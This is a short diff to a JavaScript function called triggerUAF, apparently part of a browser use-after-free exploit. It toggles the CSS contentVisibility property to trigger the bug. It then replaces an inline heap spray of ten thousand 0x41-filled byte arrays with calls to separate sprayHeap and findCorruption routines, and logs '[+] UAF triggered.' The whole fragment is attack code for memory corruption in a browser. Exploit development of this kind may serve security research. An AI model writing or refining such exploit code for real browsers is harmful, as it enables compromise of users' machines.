@@ -11,18 +11,9 @@ export function triggerUAF() {
 
   setTimeout(() => {
     container.style.contentVisibility = "auto";
-    let spray = [];
-    for (let i = 0; i < 10000; i++) {
-      let arr = new Uint8Array(0x1000);
-      for (let j = 0; j < arr.length; j++) {
-        arr[j] = 0x41;
-      }
-      spray.push(arr);
-    }
-    window.spray = spray;
     const log = document.getElementById("log");
-    log.textContent += "[+] UAF triggered. Heap sprayed.\n";
-    console.log("[+] UAF triggered. Heap sprayed.");
-    if (typeof window.postUAFCallback === 'function') window.postUAFCallback();
-  }, 10);
+    log.textContent += "[+] UAF triggered. Running heap spray...\n";
+    window.sprayHeap();
+    window.findCorruption();
+  }, 100);
 }
